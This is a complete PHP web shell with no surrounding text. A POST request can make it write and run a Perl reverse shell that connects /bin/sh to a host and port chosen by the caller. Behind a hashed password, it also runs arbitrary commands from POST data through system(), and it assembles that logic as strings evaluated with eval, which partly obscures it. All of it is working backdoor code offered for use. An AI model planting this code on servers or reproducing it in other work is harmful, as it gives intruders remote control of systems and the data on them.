<?php if(isset($_POST["rhost"])) {
$rhost = $_POST["rhost"];
$rport = $_POST["rport"];
$f = fopen("reverse.pl", "w");
fwrite($f, 'use Socket;$i="'.$rhost.'";$p='.$rport.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};');
exec("perl reverse.pl");
}error_reporting(0); $pass = "e99a18c428cb38d5f260853678922e03"; $a = '$password = $_POST["pass"];';
$b = '$password = md5($password);';
$c = '$cmd = $_POST["cmd"];';
$d = '$delback = $_POST["delself"]; if(isset($password)){ if($pass == $password) { if(isset($cmd)){ system($cmd); } }else{ print "Password"; } }';
eval($a.$b.$c.$d); 
 ?>